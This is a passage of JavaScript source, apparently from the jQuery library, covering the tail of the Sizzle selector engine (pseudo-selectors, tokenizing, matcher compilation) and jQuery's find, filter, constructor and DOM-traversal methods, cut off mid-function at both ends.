                        if ((elem.ownerDocument || elem) !== document) {
                            setDocument(elem)
                        }
                        var fn = Expr.attrHandle[name.toLowerCase()],
                            val = fn && hasOwn.call(Expr.attrHandle, name.toLowerCase()) ? fn(elem, name, !documentIsHTML) : undefined;
                        return val !== undefined ? val : support.attributes || !documentIsHTML ? elem.getAttribute(name) : (val = elem.getAttributeNode(name)) && val.specified ? val.value : null
                    };
                    Sizzle.error = function(msg) {
                        throw new Error("Syntax error, unrecognized expression: " + msg);
                    };
                    Sizzle.uniqueSort = function(results) {
                        var elem, duplicates = [],
                            j = 0,
                            i = 0;
                        hasDuplicate = !support.detectDuplicates;
                        sortInput = !support.sortStable && results.slice(0);
                        results.sort(sortOrder);
                        if (hasDuplicate) {
                            while ((elem = results[i++])) {
                                if (elem === results[i]) {
                                    j = duplicates.push(i)
                                }
                            }
                            while (j--) {
                                results.splice(duplicates[j], 1)
                            }
                        }
                        sortInput = null;
                        return results
                    };
                    getText = Sizzle.getText = function(elem) {
                        var node, ret = "",
                            i = 0,
                            nodeType = elem.nodeType;
                        if (!nodeType) {
                            while ((node = elem[i++])) {
                                ret += getText(node)
                            }
                        } else if (nodeType === 1 || nodeType === 9 || nodeType === 11) {
                            if (typeof elem.textContent === "string") {
                                return elem.textContent
                            } else {
                                for (elem = elem.firstChild; elem; elem = elem.nextSibling) {
                                    ret += getText(elem)
                                }
                            }
                        } else if (nodeType === 3 || nodeType === 4) {
                            return elem.nodeValue
                        }
                        return ret
                    };
                    Expr = Sizzle.selectors = {
                        cacheLength: 50,
                        createPseudo: markFunction,
                        match: matchExpr,
                        attrHandle: {},
                        find: {},
                        relative: {
                            ">": {
                                dir: "parentNode",
                                first: true
                            },
                            " ": {
                                dir: "parentNode"
                            },
                            "+": {
                                dir: "previousSibling",
                                first: true
                            },
                            "~": {
                                dir: "previousSibling"
                            }
                        },
                        preFilter: {
                            "ATTR": function(match) {
                                match[1] = match[1].replace(runescape, funescape);
                                match[3] = (match[3] || match[4] || match[5] || "").replace(runescape, funescape);
                                if (match[2] === "~=") {
                                    match[3] = " " + match[3] + " "
                                }
                                return match.slice(0, 4)
                            },
                            "CHILD": function(match) {
                                match[1] = match[1].toLowerCase();
                                if (match[1].slice(0, 3) === "nth") {
                                    if (!match[3]) {
                                        Sizzle.error(match[0])
                                    }
                                    match[4] = +(match[4] ? match[5] + (match[6] || 1) : 2 * (match[3] === "even" || match[3] === "odd"));
                                    match[5] = +((match[7] + match[8]) || match[3] === "odd")
                                } else if (match[3]) {
                                    Sizzle.error(match[0])
                                }
                                return match
                            },
                            "PSEUDO": function(match) {
                                var excess, unquoted = !match[6] && match[2];
                                if (matchExpr["CHILD"].test(match[0])) {
                                    return null
                                }
                                if (match[3]) {
                                    match[2] = match[4] || match[5] || ""
                                } else if (unquoted && rpseudo.test(unquoted) && (excess = tokenize(unquoted, true)) && (excess = unquoted.indexOf(")", unquoted.length - excess) - unquoted.length)) {
                                    match[0] = match[0].slice(0, excess);
                                    match[2] = unquoted.slice(0, excess)
                                }
                                return match.slice(0, 3)
                            }
                        },
                        filter: {
                            "TAG": function(nodeNameSelector) {
                                var nodeName = nodeNameSelector.replace(runescape, funescape).toLowerCase();
                                return nodeNameSelector === "*" ? function() {
                                    return true
                                } : function(elem) {
                                    return elem.nodeName && elem.nodeName.toLowerCase() === nodeName
                                }
                            },
                            "CLASS": function(className) {
                                var pattern = classCache[className + " "];
                                return pattern || (pattern = new RegExp("(^|" + whitespace + ")" + className + "(" + whitespace + "|$)")) && classCache(className, function(elem) {
                                    return pattern.test(typeof elem.className === "string" && elem.className || typeof elem.getAttribute !== "undefined" && elem.getAttribute("class") || "")
                                })
                            },
                            "ATTR": function(name, operator, check) {
                                return function(elem) {
                                    var result = Sizzle.attr(elem, name);
                                    if (result == null) {
                                        return operator === "!="
                                    }
                                    if (!operator) {
                                        return true
                                    }
                                    result += "";
                                    return operator === "=" ? result === check : operator === "!=" ? result !== check : operator === "^=" ? check && result.indexOf(check) === 0 : operator === "*=" ? check && result.indexOf(check) > -1 : operator === "$=" ? check && result.slice(-check.length) === check : operator === "~=" ? (" " + result.replace(rwhitespace, " ") + " ").indexOf(check) > -1 : operator === "|=" ? result === check || result.slice(0, check.length + 1) === check + "-" : false
                                }
                            },
                            "CHILD": function(type, what, argument, first, last) {
                                var simple = type.slice(0, 3) !== "nth",
                                    forward = type.slice(-4) !== "last",
                                    ofType = what === "of-type";
                                return first === 1 && last === 0 ? function(elem) {
                                    return !!elem.parentNode
                                } : function(elem, context, xml) {
                                    var cache, outerCache, node, diff, nodeIndex, start, dir = simple !== forward ? "nextSibling" : "previousSibling",
                                        parent = elem.parentNode,
                                        name = ofType && elem.nodeName.toLowerCase(),
                                        useCache = !xml && !ofType;
                                    if (parent) {
                                        if (simple) {
                                            while (dir) {
                                                node = elem;
                                                while ((node = node[dir])) {
                                                    if (ofType ? node.nodeName.toLowerCase() === name : node.nodeType === 1) {
                                                        return false
                                                    }
                                                }
                                                start = dir = type === "only" && !start && "nextSibling"
                                            }
                                            return true
                                        }
                                        start = [forward ? parent.firstChild : parent.lastChild];
                                        if (forward && useCache) {
                                            outerCache = parent[expando] || (parent[expando] = {});
                                            cache = outerCache[type] || [];
                                            nodeIndex = cache[0] === dirruns && cache[1];
                                            diff = cache[0] === dirruns && cache[2];
                                            node = nodeIndex && parent.childNodes[nodeIndex];
                                            while ((node = ++nodeIndex && node && node[dir] || (diff = nodeIndex = 0) || start.pop())) {
                                                if (node.nodeType === 1 && ++diff && node === elem) {
                                                    outerCache[type] = [dirruns, nodeIndex, diff];
                                                    break
                                                }
                                            }
                                        } else if (useCache && (cache = (elem[expando] || (elem[expando] = {}))[type]) && cache[0] === dirruns) {
                                            diff = cache[1]
                                        } else {
                                            while ((node = ++nodeIndex && node && node[dir] || (diff = nodeIndex = 0) || start.pop())) {
                                                if ((ofType ? node.nodeName.toLowerCase() === name : node.nodeType === 1) && ++diff) {
                                                    if (useCache) {
                                                        (node[expando] || (node[expando] = {}))[type] = [dirruns, diff]
                                                    }
                                                    if (node === elem) {
                                                        break
                                                    }
                                                }
                                            }
                                        }
                                        diff -= last;
                                        return diff === first || (diff % first === 0 && diff / first >= 0)
                                    }
                                }
                            },
                            "PSEUDO": function(pseudo, argument) {
                                var args, fn = Expr.pseudos[pseudo] || Expr.setFilters[pseudo.toLowerCase()] || Sizzle.error("unsupported pseudo: " + pseudo);
                                if (fn[expando]) {
                                    return fn(argument)
                                }
                                if (fn.length > 1) {
                                    args = [pseudo, pseudo, "", argument];
                                    return Expr.setFilters.hasOwnProperty(pseudo.toLowerCase()) ? markFunction(function(seed, matches) {
                                        var idx, matched = fn(seed, argument),
                                            i = matched.length;
                                        while (i--) {
                                            idx = indexOf(seed, matched[i]);
                                            seed[idx] = !(matches[idx] = matched[i])
                                        }
                                    }) : function(elem) {
                                        return fn(elem, 0, args)
                                    }
                                }
                                return fn
                            }
                        },
                        pseudos: {
                            "not": markFunction(function(selector) {
                                var input = [],
                                    results = [],
                                    matcher = compile(selector.replace(rtrim, "$1"));
                                return matcher[expando] ? markFunction(function(seed, matches, context, xml) {
                                    var elem, unmatched = matcher(seed, null, xml, []),
                                        i = seed.length;
                                    while (i--) {
                                        if ((elem = unmatched[i])) {
                                            seed[i] = !(matches[i] = elem)
                                        }
                                    }
                                }) : function(elem, context, xml) {
                                    input[0] = elem;
                                    matcher(input, null, xml, results);
                                    input[0] = null;
                                    return !results.pop()
                                }
                            }),
                            "has": markFunction(function(selector) {
                                return function(elem) {
                                    return Sizzle(selector, elem).length > 0
                                }
                            }),
                            "contains": markFunction(function(text) {
                                text = text.replace(runescape, funescape);
                                return function(elem) {
                                    return (elem.textContent || elem.innerText || getText(elem)).indexOf(text) > -1
                                }
                            }),
                            "lang": markFunction(function(lang) {
                                if (!ridentifier.test(lang || "")) {
                                    Sizzle.error("unsupported lang: " + lang)
                                }
                                lang = lang.replace(runescape, funescape).toLowerCase();
                                return function(elem) {
                                    var elemLang;
                                    do {
                                        if ((elemLang = documentIsHTML ? elem.lang : elem.getAttribute("xml:lang") || elem.getAttribute("lang"))) {
                                            elemLang = elemLang.toLowerCase();
                                            return elemLang === lang || elemLang.indexOf(lang + "-") === 0
                                        }
                                    } while ((elem = elem.parentNode) && elem.nodeType === 1);
                                    return false
                                }
                            }),
                            "target": function(elem) {
                                var hash = window.location && window.location.hash;
                                return hash && hash.slice(1) === elem.id
                            },
                            "root": function(elem) {
                                return elem === docElem
                            },
                            "focus": function(elem) {
                                return elem === document.activeElement && (!document.hasFocus || document.hasFocus()) && !!(elem.type || elem.href || ~elem.tabIndex)
                            },
                            "enabled": function(elem) {
                                return elem.disabled === false
                            },
                            "disabled": function(elem) {
                                return elem.disabled === true
                            },
                            "checked": function(elem) {
                                var nodeName = elem.nodeName.toLowerCase();
                                return (nodeName === "input" && !!elem.checked) || (nodeName === "option" && !!elem.selected)
                            },
                            "selected": function(elem) {
                                if (elem.parentNode) {
                                    elem.parentNode.selectedIndex
                                }
                                return elem.selected === true
                            },
                            "empty": function(elem) {
                                for (elem = elem.firstChild; elem; elem = elem.nextSibling) {
                                    if (elem.nodeType < 6) {
                                        return false
                                    }
                                }
                                return true
                            },
                            "parent": function(elem) {
                                return !Expr.pseudos["empty"](elem)
                            },
                            "header": function(elem) {
                                return rheader.test(elem.nodeName)
                            },
                            "input": function(elem) {
                                return rinputs.test(elem.nodeName)
                            },
                            "button": function(elem) {
                                var name = elem.nodeName.toLowerCase();
                                return name === "input" && elem.type === "button" || name === "button"
                            },
                            "text": function(elem) {
                                var attr;
                                return elem.nodeName.toLowerCase() === "input" && elem.type === "text" && ((attr = elem.getAttribute("type")) == null || attr.toLowerCase() === "text")
                            },
                            "first": createPositionalPseudo(function() {
                                return [0]
                            }),
                            "last": createPositionalPseudo(function(matchIndexes, length) {
                                return [length - 1]
                            }),
                            "eq": createPositionalPseudo(function(matchIndexes, length, argument) {
                                return [argument < 0 ? argument + length : argument]
                            }),
                            "even": createPositionalPseudo(function(matchIndexes, length) {
                                var i = 0;
                                for (; i < length; i += 2) {
                                    matchIndexes.push(i)
                                }
                                return matchIndexes
                            }),
                            "odd": createPositionalPseudo(function(matchIndexes, length) {
                                var i = 1;
                                for (; i < length; i += 2) {
                                    matchIndexes.push(i)
                                }
                                return matchIndexes
                            }),
                            "lt": createPositionalPseudo(function(matchIndexes, length, argument) {
                                var i = argument < 0 ? argument + length : argument;
                                for (; --i >= 0;) {
                                    matchIndexes.push(i)
                                }
                                return matchIndexes
                            }),
                            "gt": createPositionalPseudo(function(matchIndexes, length, argument) {
                                var i = argument < 0 ? argument + length : argument;
                                for (; ++i < length;) {
                                    matchIndexes.push(i)
                                }
                                return matchIndexes
                            })
                        }
                    };
                    Expr.pseudos["nth"] = Expr.pseudos["eq"];
                    for (i in {
                            radio: true,
                            checkbox: true,
                            file: true,
                            password: true,
                            image: true
                        }) {
                        Expr.pseudos[i] = createInputPseudo(i)
                    }
                    for (i in {
                            submit: true,
                            reset: true
                        }) {
                        Expr.pseudos[i] = createButtonPseudo(i)
                    }

                    function setFilters() {}
                    setFilters.prototype = Expr.filters = Expr.pseudos;
                    Expr.setFilters = new setFilters();
                    tokenize = Sizzle.tokenize = function(selector, parseOnly) {
                        var matched, match, tokens, type, soFar, groups, preFilters, cached = tokenCache[selector + " "];
                        if (cached) {
                            return parseOnly ? 0 : cached.slice(0)
                        }
                        soFar = selector;
                        groups = [];
                        preFilters = Expr.preFilter;
                        while (soFar) {
                            if (!matched || (match = rcomma.exec(soFar))) {
                                if (match) {
                                    soFar = soFar.slice(match[0].length) || soFar
                                }
                                groups.push((tokens = []))
                            }
                            matched = false;
                            if ((match = rcombinators.exec(soFar))) {
                                matched = match.shift();
                                tokens.push({
                                    value: matched,
                                    type: match[0].replace(rtrim, " ")
                                });
                                soFar = soFar.slice(matched.length)
                            }
                            for (type in Expr.filter) {
                                if ((match = matchExpr[type].exec(soFar)) && (!preFilters[type] || (match = preFilters[type](match)))) {
                                    matched = match.shift();
                                    tokens.push({
                                        value: matched,
                                        type: type,
                                        matches: match
                                    });
                                    soFar = soFar.slice(matched.length)
                                }
                            }
                            if (!matched) {
                                break
                            }
                        }
                        return parseOnly ? soFar.length : soFar ? Sizzle.error(selector) : tokenCache(selector, groups).slice(0)
                    };

                    function toSelector(tokens) {
                        var i = 0,
                            len = tokens.length,
                            selector = "";
                        for (; i < len; i++) {
                            selector += tokens[i].value
                        }
                        return selector
                    }

                    function addCombinator(matcher, combinator, base) {
                        var dir = combinator.dir,
                            checkNonElements = base && dir === "parentNode",
                            doneName = done++;
                        return combinator.first ? function(elem, context, xml) {
                            while ((elem = elem[dir])) {
                                if (elem.nodeType === 1 || checkNonElements) {
                                    return matcher(elem, context, xml)
                                }
                            }
                        } : function(elem, context, xml) {
                            var oldCache, outerCache, newCache = [dirruns, doneName];
                            if (xml) {
                                while ((elem = elem[dir])) {
                                    if (elem.nodeType === 1 || checkNonElements) {
                                        if (matcher(elem, context, xml)) {
                                            return true
                                        }
                                    }
                                }
                            } else {
                                while ((elem = elem[dir])) {
                                    if (elem.nodeType === 1 || checkNonElements) {
                                        outerCache = elem[expando] || (elem[expando] = {});
                                        if ((oldCache = outerCache[dir]) && oldCache[0] === dirruns && oldCache[1] === doneName) {
                                            return (newCache[2] = oldCache[2])
                                        } else {
                                            outerCache[dir] = newCache;
                                            if ((newCache[2] = matcher(elem, context, xml))) {
                                                return true
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }

                    function elementMatcher(matchers) {
                        return matchers.length > 1 ? function(elem, context, xml) {
                            var i = matchers.length;
                            while (i--) {
                                if (!matchers[i](elem, context, xml)) {
                                    return false
                                }
                            }
                            return true
                        } : matchers[0]
                    }

                    function multipleContexts(selector, contexts, results) {
                        var i = 0,
                            len = contexts.length;
                        for (; i < len; i++) {
                            Sizzle(selector, contexts[i], results)
                        }
                        return results
                    }

                    function condense(unmatched, map, filter, context, xml) {
                        var elem, newUnmatched = [],
                            i = 0,
                            len = unmatched.length,
                            mapped = map != null;
                        for (; i < len; i++) {
                            if ((elem = unmatched[i])) {
                                if (!filter || filter(elem, context, xml)) {
                                    newUnmatched.push(elem);
                                    if (mapped) {
                                        map.push(i)
                                    }
                                }
                            }
                        }
                        return newUnmatched
                    }

                    function setMatcher(preFilter, selector, matcher, postFilter, postFinder, postSelector) {
                        if (postFilter && !postFilter[expando]) {
                            postFilter = setMatcher(postFilter)
                        }
                        if (postFinder && !postFinder[expando]) {
                            postFinder = setMatcher(postFinder, postSelector)
                        }
                        return markFunction(function(seed, results, context, xml) {
                            var temp, i, elem, preMap = [],
                                postMap = [],
                                preexisting = results.length,
                                elems = seed || multipleContexts(selector || "*", context.nodeType ? [context] : context, []),
                                matcherIn = preFilter && (seed || !selector) ? condense(elems, preMap, preFilter, context, xml) : elems,
                                matcherOut = matcher ? postFinder || (seed ? preFilter : preexisting || postFilter) ? [] : results : matcherIn;
                            if (matcher) {
                                matcher(matcherIn, matcherOut, context, xml)
                            }
                            if (postFilter) {
                                temp = condense(matcherOut, postMap);
                                postFilter(temp, [], context, xml);
                                i = temp.length;
                                while (i--) {
                                    if ((elem = temp[i])) {
                                        matcherOut[postMap[i]] = !(matcherIn[postMap[i]] = elem)
                                    }
                                }
                            }
                            if (seed) {
                                if (postFinder || preFilter) {
                                    if (postFinder) {
                                        temp = [];
                                        i = matcherOut.length;
                                        while (i--) {
                                            if ((elem = matcherOut[i])) {
                                                temp.push((matcherIn[i] = elem))
                                            }
                                        }
                                        postFinder(null, (matcherOut = []), temp, xml)
                                    }
                                    i = matcherOut.length;
                                    while (i--) {
                                        if ((elem = matcherOut[i]) && (temp = postFinder ? indexOf(seed, elem) : preMap[i]) > -1) {
                                            seed[temp] = !(results[temp] = elem)
                                        }
                                    }
                                }
                            } else {
                                matcherOut = condense(matcherOut === results ? matcherOut.splice(preexisting, matcherOut.length) : matcherOut);
                                if (postFinder) {
                                    postFinder(null, results, matcherOut, xml)
                                } else {
                                    push.apply(results, matcherOut)
                                }
                            }
                        })
                    }

                    function matcherFromTokens(tokens) {
                        var checkContext, matcher, j, len = tokens.length,
                            leadingRelative = Expr.relative[tokens[0].type],
                            implicitRelative = leadingRelative || Expr.relative[" "],
                            i = leadingRelative ? 1 : 0,
                            matchContext = addCombinator(function(elem) {
                                return elem === checkContext
                            }, implicitRelative, true),
                            matchAnyContext = addCombinator(function(elem) {
                                return indexOf(checkContext, elem) > -1
                            }, implicitRelative, true),
                            matchers = [function(elem, context, xml) {
                                var ret = (!leadingRelative && (xml || context !== outermostContext)) || ((checkContext = context).nodeType ? matchContext(elem, context, xml) : matchAnyContext(elem, context, xml));
                                checkContext = null;
                                return ret
                            }];
                        for (; i < len; i++) {
                            if ((matcher = Expr.relative[tokens[i].type])) {
                                matchers = [addCombinator(elementMatcher(matchers), matcher)]
                            } else {
                                matcher = Expr.filter[tokens[i].type].apply(null, tokens[i].matches);
                                if (matcher[expando]) {
                                    j = ++i;
                                    for (; j < len; j++) {
                                        if (Expr.relative[tokens[j].type]) {
                                            break
                                        }
                                    }
                                    return setMatcher(i > 1 && elementMatcher(matchers), i > 1 && toSelector(tokens.slice(0, i - 1).concat({
                                        value: tokens[i - 2].type === " " ? "*" : ""
                                    })).replace(rtrim, "$1"), matcher, i < j && matcherFromTokens(tokens.slice(i, j)), j < len && matcherFromTokens((tokens = tokens.slice(j))), j < len && toSelector(tokens))
                                }
                                matchers.push(matcher)
                            }
                        }
                        return elementMatcher(matchers)
                    }

                    function matcherFromGroupMatchers(elementMatchers, setMatchers) {
                        var bySet = setMatchers.length > 0,
                            byElement = elementMatchers.length > 0,
                            superMatcher = function(seed, context, xml, results, outermost) {
                                var elem, j, matcher, matchedCount = 0,
                                    i = "0",
                                    unmatched = seed && [],
                                    setMatched = [],
                                    contextBackup = outermostContext,
                                    elems = seed || byElement && Expr.find["TAG"]("*", outermost),
                                    dirrunsUnique = (dirruns += contextBackup == null ? 1 : Math.random() || 0.1),
                                    len = elems.length;
                                if (outermost) {
                                    outermostContext = context !== document && context
                                }
                                for (; i !== len && (elem = elems[i]) != null; i++) {
                                    if (byElement && elem) {
                                        j = 0;
                                        while ((matcher = elementMatchers[j++])) {
                                            if (matcher(elem, context, xml)) {
                                                results.push(elem);
                                                break
                                            }
                                        }
                                        if (outermost) {
                                            dirruns = dirrunsUnique
                                        }
                                    }
                                    if (bySet) {
                                        if ((elem = !matcher && elem)) {
                                            matchedCount--
                                        }
                                        if (seed) {
                                            unmatched.push(elem)
                                        }
                                    }
                                }
                                matchedCount += i;
                                if (bySet && i !== matchedCount) {
                                    j = 0;
                                    while ((matcher = setMatchers[j++])) {
                                        matcher(unmatched, setMatched, context, xml)
                                    }
                                    if (seed) {
                                        if (matchedCount > 0) {
                                            while (i--) {
                                                if (!(unmatched[i] || setMatched[i])) {
                                                    setMatched[i] = pop.call(results)
                                                }
                                            }
                                        }
                                        setMatched = condense(setMatched)
                                    }
                                    push.apply(results, setMatched);
                                    if (outermost && !seed && setMatched.length > 0 && (matchedCount + setMatchers.length) > 1) {
                                        Sizzle.uniqueSort(results)
                                    }
                                }
                                if (outermost) {
                                    dirruns = dirrunsUnique;
                                    outermostContext = contextBackup
                                }
                                return unmatched
                            };
                        return bySet ? markFunction(superMatcher) : superMatcher
                    }
                    compile = Sizzle.compile = function(selector, match) {
                        var i, setMatchers = [],
                            elementMatchers = [],
                            cached = compilerCache[selector + " "];
                        if (!cached) {
                            if (!match) {
                                match = tokenize(selector)
                            }
                            i = match.length;
                            while (i--) {
                                cached = matcherFromTokens(match[i]);
                                if (cached[expando]) {
                                    setMatchers.push(cached)
                                } else {
                                    elementMatchers.push(cached)
                                }
                            }
                            cached = compilerCache(selector, matcherFromGroupMatchers(elementMatchers, setMatchers));
                            cached.selector = selector
                        }
                        return cached
                    };
                    select = Sizzle.select = function(selector, context, results, seed) {
                        var i, tokens, token, type, find, compiled = typeof selector === "function" && selector,
                            match = !seed && tokenize((selector = compiled.selector || selector));
                        results = results || [];
                        if (match.length === 1) {
                            tokens = match[0] = match[0].slice(0);
                            if (tokens.length > 2 && (token = tokens[0]).type === "ID" && support.getById && context.nodeType === 9 && documentIsHTML && Expr.relative[tokens[1].type]) {
                                context = (Expr.find["ID"](token.matches[0].replace(runescape, funescape), context) || [])[0];
                                if (!context) {
                                    return results
                                } else if (compiled) {
                                    context = context.parentNode
                                }
                                selector = selector.slice(tokens.shift().value.length)
                            }
                            i = matchExpr["needsContext"].test(selector) ? 0 : tokens.length;
                            while (i--) {
                                token = tokens[i];
                                if (Expr.relative[(type = token.type)]) {
                                    break
                                }
                                if ((find = Expr.find[type])) {
                                    if ((seed = find(token.matches[0].replace(runescape, funescape), rsibling.test(tokens[0].type) && testContext(context.parentNode) || context))) {
                                        tokens.splice(i, 1);
                                        selector = seed.length && toSelector(tokens);
                                        if (!selector) {
                                            push.apply(results, seed);
                                            return results
                                        }
                                        break
                                    }
                                }
                            }
                        }(compiled || compile(selector, match))(seed, context, !documentIsHTML, results, rsibling.test(selector) && testContext(context.parentNode) || context);
                        return results
                    };
                    support.sortStable = expando.split("").sort(sortOrder).join("") === expando;
                    support.detectDuplicates = !!hasDuplicate;
                    setDocument();
                    support.sortDetached = assert(function(div1) {
                        return div1.compareDocumentPosition(document.createElement("div")) & 1
                    });
                    if (!assert(function(div) {
                            div.innerHTML = "<a href='#'></a>";
                            return div.firstChild.getAttribute("href") === "#"
                        })) {
                        addHandle("type|href|height|width", function(elem, name, isXML) {
                            if (!isXML) {
                                return elem.getAttribute(name, name.toLowerCase() === "type" ? 1 : 2)
                            }
                        })
                    }
                    if (!support.attributes || !assert(function(div) {
                            div.innerHTML = "<input/>";
                            div.firstChild.setAttribute("value", "");
                            return div.firstChild.getAttribute("value") === ""
                        })) {
                        addHandle("value", function(elem, name, isXML) {
                            if (!isXML && elem.nodeName.toLowerCase() === "input") {
                                return elem.defaultValue
                            }
                        })
                    }
                    if (!assert(function(div) {
                            return div.getAttribute("disabled") == null
                        })) {
                        addHandle(booleans, function(elem, name, isXML) {
                            var val;
                            if (!isXML) {
                                return elem[name] === true ? name.toLowerCase() : (val = elem.getAttributeNode(name)) && val.specified ? val.value : null
                            }
                        })
                    }
                    return Sizzle
                })(window);
                jQuery.find = Sizzle;
                jQuery.expr = Sizzle.selectors;
                jQuery.expr[":"] = jQuery.expr.pseudos;
                jQuery.unique = Sizzle.uniqueSort;
                jQuery.text = Sizzle.getText;
                jQuery.isXMLDoc = Sizzle.isXML;
                jQuery.contains = Sizzle.contains;
                var rneedsContext = jQuery.expr.match.needsContext;
                var rsingleTag = (/^<(\w+)\s*\/?>(?:<\/\1>|)$/);
                var risSimple = /^.[^:#\[\.,]*$/;

                function winnow(elements, qualifier, not) {
                    if (jQuery.isFunction(qualifier)) {
                        return jQuery.grep(elements, function(elem, i) {
                            return !!qualifier.call(elem, i, elem) !== not
                        })
                    }
                    if (qualifier.nodeType) {
                        return jQuery.grep(elements, function(elem) {
                            return (elem === qualifier) !== not
                        })
                    }
                    if (typeof qualifier === "string") {
                        if (risSimple.test(qualifier)) {
                            return jQuery.filter(qualifier, elements, not)
                        }
                        qualifier = jQuery.filter(qualifier, elements)
                    }
                    return jQuery.grep(elements, function(elem) {
                        return (jQuery.inArray(elem, qualifier) >= 0) !== not
                    })
                }
                jQuery.filter = function(expr, elems, not) {
                    var elem = elems[0];
                    if (not) {
                        expr = ":not(" + expr + ")"
                    }
                    return elems.length === 1 && elem.nodeType === 1 ? jQuery.find.matchesSelector(elem, expr) ? [elem] : [] : jQuery.find.matches(expr, jQuery.grep(elems, function(elem) {
                        return elem.nodeType === 1
                    }))
                };
                jQuery.fn.extend({
                    find: function(selector) {
                        var i, ret = [],
                            self = this,
                            len = self.length;
                        if (typeof selector !== "string") {
                            return this.pushStack(jQuery(selector).filter(function() {
                                for (i = 0; i < len; i++) {
                                    if (jQuery.contains(self[i], this)) {
                                        return true
                                    }
                                }
                            }))
                        }
                        for (i = 0; i < len; i++) {
                            jQuery.find(selector, self[i], ret)
                        }
                        ret = this.pushStack(len > 1 ? jQuery.unique(ret) : ret);
                        ret.selector = this.selector ? this.selector + " " + selector : selector;
                        return ret
                    },
                    filter: function(selector) {
                        return this.pushStack(winnow(this, selector || [], false))
                    },
                    not: function(selector) {
                        return this.pushStack(winnow(this, selector || [], true))
                    },
                    is: function(selector) {
                        return !!winnow(this, typeof selector === "string" && rneedsContext.test(selector) ? jQuery(selector) : selector || [], false).length
                    }
                });
                var rootjQuery, document = window.document,
                    rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,
                    init = jQuery.fn.init = function(selector, context) {
                        var match, elem;
                        if (!selector) {
                            return this
                        }
                        if (typeof selector === "string") {
                            if (selector.charAt(0) === "<" && selector.charAt(selector.length - 1) === ">" && selector.length >= 3) {
                                match = [null, selector, null]
                            } else {
                                match = rquickExpr.exec(selector)
                            }
                            if (match && (match[1] || !context)) {
                                if (match[1]) {
                                    context = context instanceof jQuery ? context[0] : context;
                                    jQuery.merge(this, jQuery.parseHTML(match[1], context && context.nodeType ? context.ownerDocument || context : document, true));
                                    if (rsingleTag.test(match[1]) && jQuery.isPlainObject(context)) {
                                        for (match in context) {
                                            if (jQuery.isFunction(this[match])) {
                                                this[match](context[match])
                                            } else {
                                                this.attr(match, context[match])
                                            }
                                        }
                                    }
                                    return this
                                } else {
                                    elem = document.getElementById(match[2]);
                                    if (elem && elem.parentNode) {
                                        if (elem.id !== match[2]) {
                                            return rootjQuery.find(selector)
                                        }
                                        this.length = 1;
                                        this[0] = elem
                                    }
                                    this.context = document;
                                    this.selector = selector;
                                    return this
                                }
                            } else if (!context || context.jquery) {
                                return (context || rootjQuery).find(selector)
                            } else {
                                return this.constructor(context).find(selector)
                            }
                        } else if (selector.nodeType) {
                            this.context = this[0] = selector;
                            this.length = 1;
                            return this
                        } else if (jQuery.isFunction(selector)) {
                            return typeof rootjQuery.ready !== "undefined" ? rootjQuery.ready(selector) : selector(jQuery)
                        }
                        if (selector.selector !== undefined) {
                            this.selector = selector.selector;
                            this.context = selector.context
                        }
                        return jQuery.makeArray(selector, this)
                    };
                init.prototype = jQuery.fn;
                rootjQuery = jQuery(document);
                var rparentsprev = /^(?:parents|prev(?:Until|All))/,
                    guaranteedUnique = {
                        children: true,
                        contents: true,
                        next: true,
                        prev: true
                    };
                jQuery.extend({
                    dir: function(elem, dir, until) {
                        var matched = [],
                            cur = elem[dir];
                        while (cur && cur.nodeType !== 9 && (until === undefined || cur.nodeType !== 1 || !jQuery(cur).is(until))) {
                            if (cur.nodeType === 1) {
                                matched.push(cur)
                            }
                            cur = cur[dir]
                        }
                        return matched
                    },
                    sibling: function(n, elem) {
                        var r = [];
                        for (; n; n = n.nextSibling) {
                            if (n.nodeType === 1 && n !== elem) {
                                r.push(n)
                            }
                        }
                        return r
                    }
                });
                jQuery.fn.extend({
                    has: function(target) {
                        var i, targets = jQuery(target, this),
                            len = targets.length;
                        return this.filter(function() {
                            for (i = 0; i < len; i++) {
                                if (jQuery.contains(this, targets[i])) {
                                    return true
                                }
                            }
                        })
                    },
                    closest: function(selectors, context) {
                        var cur, i = 0,
                            l = this.length,
                            matched = [],
                            pos = rneedsContext.test(selectors) || typeof selectors !== "string" ? jQuery(selectors, context || this.context) : 0;
                        for (; i < l; i++) {
                            for (cur = this[i]; cur && cur !== context; cur = cur.parentNode) {
                                if (cur.nodeType < 11 && (pos ? pos.index(cur) > -1 : cur.nodeType === 1 && jQuery.find.matchesSelector(cur, selectors))) {
                                    matched.push(cur);
                                    break
                                }
                            }
                        }
                        return this.pushStack(matched.length > 1 ? jQuery.unique(matched) : matched)
                    },
                    index: function(elem) {
                        if (!elem) {
                            return (this[0] && this[0].parentNode) ? this.first().prevAll().length : -1
                        }
                        if (typeof elem === "string") {
                            return jQuery.inArray(this[0], jQuery(elem))
                        }
                        return jQuery.inArray(elem.jquery ? elem[0] : elem, this)
                    },
                    add: function(selector, context) {
                        return this.pushStack(jQuery.unique(jQuery.merge(this.get(), jQuery(selector, context))))
                    },
                    addBack: function(selector) {
                        return this.add(selector == null ? this.prevObject : this.prevObject.filter(selector))
                    }
                });

                function sibling(cur, dir) {
                    do {
                        cur = cur[dir]
                    } while (cur && cur.nodeType !== 1);
                    return cur
                }
                jQuery.each({
                    parent: function(elem) {
                        var parent = elem.parentNode;
                        return parent && parent.nodeType !== 11 ? parent : null
                    },
                    parents: function(elem) {
                        return jQuery.dir(elem, "parentNode")
                    },
                    parentsUntil: function(elem, i, until) {
                        return jQuery.dir(elem, "parentNode", until)
                    },
                    next: function(elem) {
                        return sibling(elem, "nextSibling")
                    },
                    prev: function(elem) {
                        return sibling(elem, "previousSibling")
                    },
                    nextAll: function(elem) {
                        return jQuery.dir(elem, "nextSibling")
                    },
                    prevAll: function(elem) {
                        return jQuery.dir(elem, "previousSibling")
                    },
                    nextUntil: function(elem, i, until) {
                        return jQuery.dir(elem, "nextSibling", until)
                    },
                    prevUntil: function(elem, i, until) {
                        return jQuery.dir(elem, "previousSibling", until)
                    },
                    siblings: function(elem) {
                        return jQuery.sibling((elem.parentNode || {}).firstChild, elem)
                    },
                    children: function(elem) {
                        return jQuery.sibling(elem.firstChild)
                    },
                    contents: function(elem) {
                        return jQuery.nodeName(elem, "iframe") ? elem.contentDocument || elem.contentWindow.document : jQuery.merge([], elem.childNodes)
                    }
                }, function(name, fn) {
                    jQuery.fn[name] = function(until, selector) {
                        var ret = jQuery.map(this, fn, until);
                        if (name.slice(-5) !== "Until") {
                            selector = until
                        }
                        if (selector && typeof selector === "string") {
